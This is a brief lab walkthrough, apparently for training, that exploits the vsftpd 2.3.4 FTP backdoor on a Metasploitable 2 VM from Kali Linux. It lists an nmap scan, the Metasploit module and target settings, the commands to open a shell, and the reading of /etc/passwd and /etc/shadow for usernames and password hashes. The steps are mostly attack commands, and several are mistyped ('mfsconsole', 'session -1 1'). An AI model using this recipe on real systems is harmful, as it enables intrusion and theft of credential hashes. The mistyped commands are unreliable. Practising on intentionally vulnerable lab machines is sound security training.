# FTP Backdoor
Tools: Kali Linux and Metasploitable 2 Machines
Log in to Metasploitable (Username: msfadmin, Password: msfadmin)
Find the target's ip address: ifconfig (192.168.56.101)
On your kali machine type: nmap -A 192.168.56.101
The attack phase is taking place in your Kali:
Open Metasploit: mfsconsole
Select the Exploit: use exploit/unix/ftp/vsftpd_234_backdoor
Set the target: set RHOSTs 192.168.56.101
Execute: exploit
Type: session
Output: You get to see the active sessions.
Type: session -1 1
Output: You start interacting with the shell

Verification of the exploitation:
uname -a gives details of the version of the system
ls to list the files and current files and directories
cat /etc/passwd enables you to see the usernames, Userids, Home directories, and default shells
cat /etc/shadow enables you to see hashed passwords, Password aging information, and account expiration details

